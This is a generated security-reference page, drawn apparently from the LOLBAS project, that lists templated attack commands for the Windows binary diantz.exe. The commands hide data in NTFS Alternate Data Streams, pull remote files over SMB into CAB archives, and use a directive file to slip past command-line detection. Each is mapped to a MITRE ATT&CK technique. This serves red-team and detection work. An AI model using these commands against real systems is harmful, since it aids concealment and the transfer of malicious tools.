---
parsed_by: focuslocust
source: commands
type: generated
---
# Diantz Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Diantz.exe

Tool page: [Diantz.exe](../../tools/windows/diantz.exe.md)

### Hide data compressed into an Alternate Data Stream.

```text
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab
```

Description:

Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Diantz.yml` |
| Evidence | Command preserved from source parser. |

### Download and compress into a cab file.

```text
diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
```

Description:

Download and compress a remote file and store it in a CAB file on local machine.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Diantz.yml` |
| Evidence | Command preserved from source parser. |

### Bypass command-line based detections

```text
diantz /f {PATH:.ddf}
```

Description:

Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.

Related ATT&CK:

- [T1036](../../attack/techniques/T1036-masquerading.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Diantz.yml` |
| Evidence | Command preserved from source parser. |
